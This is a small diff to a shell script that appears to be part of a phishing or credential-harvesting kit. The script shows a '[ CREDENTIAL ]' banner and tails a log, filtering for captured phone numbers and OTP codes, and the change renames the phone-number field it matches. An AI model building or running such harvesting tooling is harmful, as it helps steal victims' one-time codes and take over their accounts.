@@ -84,7 +84,7 @@ echo ""
                 echo ""
                 echo -e $green "//  [ CREDENTIAL ] //"
                 echo ""
-                tail -f log.txt | grep -e "number" -e "OTP"
+                tail -f log.txt | grep -e "phoneNo" -e "OTP"
 
 
 
